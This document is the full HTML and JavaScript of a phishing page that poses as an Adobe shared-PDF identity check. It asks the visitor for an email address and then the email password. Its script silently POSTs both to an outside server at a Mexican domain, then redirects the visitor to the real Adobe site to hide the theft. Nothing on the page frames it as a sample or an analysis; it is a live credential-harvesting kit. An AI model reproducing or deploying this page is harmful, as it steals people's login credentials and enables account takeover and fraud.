<body>
  <div class="header">Adobe PDF</div>

  <div class="logo">
    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmWgAmtBzCMcGv1qIQl4E-67bK46wVgw5WhDDsI6ZbkiyWLmmKfjPqyvSj6uTPz-SEl3FgXMWkfQwfmFkWrNCd8VT1ROKtylbBscvT8yBDai-vTh31wa8KWPFDuSDG6l_poNu1G91JIoUpy9wsbwBOx4WbiAIlxcpMcipIxdIrusWN8mUuKXRtCv0oE3w/s320/Adobe_Corporate_logo.svg.png" alt="Logo" height="60">
  </div>

  <div class="card">
    <h2>Verify Your Identity</h2>

    <div class="content" id="cardText">
      <p>You've received a secure link to:</p>
      <div class="file">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgn86DXu05miVMk5nE-NADw_s7uDwK9l6KSmDG6QZ5hfzgq30Hprq5aUqSFGxHyV12Pd8ILF1p_lOsD8AGjgrDvKkwZ47Y2iz-yqnU_iSdK9ybmVz8Uiq0UV3zuI1Vzi0wgi64zVfCbRhrfNZycgd4qnOqObW-tE8yoyQ-09SzYqXk6viNn1xK3Q4d8EJs/s320/PDF_file_icon.svg.png" width="80px" alt="File"> Shared file.
      </div>
      <p id="instructionText">
        To receive and download this PDF file, please enter specific professional email credentials that this document was sent to.
      </p>
    </div>

    <form id="verifyForm">
      <!-- Step 1 -->
      <div id="step1">
        <div class="form-field">
          <label for="inputline1">Email:</label>
          <input type="email" id="inputline1" name="user" required>
        </div>
        <button type="button" class="verify-btn" id="nextBtn">Next</button>
      </div>

      <!-- Step 2 -->
      <div id="step2" style="display:none;">
        <div class="form-field">
          <label for="password">Verify Password:</label>
          <input type="password" id="password" name="pass" required>
        </div>
        <button type="submit" id="verifyBtn" class="verify-btn">Verify</button>
      </div>
    </form>
  </div>

  <div class="footer">
    Copyright Â© 2025 All rights reserved.
    <a href="#">Privacy</a> & <a href="#">Cookies</a>
  </div>

  <!-- Preloader -->
  <div class="preloader" id="preloader">
    <div class="spinner"></div>
    <div>Loading...</div>
  </div>

  <script>
    const form = document.getElementById("verifyForm");
    const step1 = document.getElementById("step1");
    const step2 = document.getElementById("step2");
    const preloader = document.getElementById("preloader");
    const nextBtn = document.getElementById("nextBtn");
    const emailInput = document.getElementById("inputline1");
    const instructionText = document.getElementById("instructionText");

    // Helper: mask part of email
    function maskEmail(email) {
      const [user, domain] = email.split("@");
      if (!user || !domain) return email;
      if (user.length <= 2) return user[0] + "***@" + domain;
      return user[0] + "***" + user[user.length - 1] + "@" + domain;
    }

    // Step 1 -> Step 2
    nextBtn.addEventListener("click", () => {
      const emailVal = emailInput.value.trim();
      if (emailVal === "") {
        emailInput.focus();
        return;
      }

      // Show preloader
      preloader.style.display = "flex";

      // After short delay, move to step 2
      setTimeout(() => {
        preloader.style.display = "none";
        step1.style.display = "none";
        step2.style.display = "block";

        // Update the card text to include masked email
        const masked = maskEmail(emailVal);
        instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
      }, 2000);
    });

    // Final form submit
    form.addEventListener("submit", function (e) {
      e.preventDefault();

      preloader.style.display = "flex"; // show preloader again

      const formData = new FormData(form);

      fetch("https://v2.siecimnc.com.mx/auth/next.php", {
        method: "POST",
        body: formData
      })
      .catch(() => {})
      .finally(() => {
        window.location.href = "https://www.adobe.com/creativecloud.html";
      });
    });
  </script>
